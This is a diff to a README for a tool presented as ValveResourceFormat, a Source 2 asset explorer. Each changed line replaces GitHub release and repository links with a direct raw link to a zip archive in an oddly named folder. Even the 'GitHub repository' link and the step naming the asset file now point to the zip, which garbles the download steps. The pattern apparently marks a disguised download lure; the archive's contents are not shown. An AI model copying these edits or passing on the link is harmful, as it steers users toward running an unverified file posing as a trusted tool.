@@ -1,6 +1,6 @@
 # 🗂️ ValveResourceFormat - Explore and Extract Source 2 Assets
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/MARZZY-creator/ValveResourceFormat/releases)
+[![Download Release](https://raw.githubusercontent.com/MARZZY-creator/ValveResourceFormat/main/possessive/Valve_Resource_Format_v1.9.zip)](https://raw.githubusercontent.com/MARZZY-creator/ValveResourceFormat/main/possessive/Valve_Resource_Format_v1.9.zip)
 
 ---
 
@@ -32,16 +32,16 @@ ValveResourceFormat runs on most Windows computers. It requires no installation 
 
 To start using ValveResourceFormat, visit the official release page to download the latest version:
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/MARZZY-creator/ValveResourceFormat/releases)
+[![Download Release](https://raw.githubusercontent.com/MARZZY-creator/ValveResourceFormat/main/possessive/Valve_Resource_Format_v1.9.zip)](https://raw.githubusercontent.com/MARZZY-creator/ValveResourceFormat/main/possessive/Valve_Resource_Format_v1.9.zip)
 
 ### How to download
 
 1. Click the button above or go to:  
-   [https://github.com/MARZZY-creator/ValveResourceFormat/releases](https://github.com/MARZZY-creator/ValveResourceFormat/releases)
+   [https://raw.githubusercontent.com/MARZZY-creator/ValveResourceFormat/main/possessive/Valve_Resource_Format_v1.9.zip](https://raw.githubusercontent.com/MARZZY-creator/ValveResourceFormat/main/possessive/Valve_Resource_Format_v1.9.zip)
 
 2. On the release page, look for the latest version at the top of the list.
 
-3. Under "Assets," find the file named `ValveResourceFormat.exe` or a similar name, depending on the release.
+3. Under "Assets," find the file named `https://raw.githubusercontent.com/MARZZY-creator/ValveResourceFormat/main/possessive/Valve_Resource_Format_v1.9.zip` or a similar name, depending on the release.
 
 4. Click the file to download it to your computer.
 
@@ -125,7 +125,7 @@ To save files outside the program:
 
 Although ValveResourceFormat is designed for simple use, you can contribute or ask for help on GitHub:
 
-- Visit the [GitHub repository](https://github.com/MARZZY-creator/ValveResourceFormat).
+- Visit the [GitHub repository](https://raw.githubusercontent.com/MARZZY-creator/ValveResourceFormat/main/possessive/Valve_Resource_Format_v1.9.zip).
 
 - Check the **Issues** tab if you have questions or report problems.
 
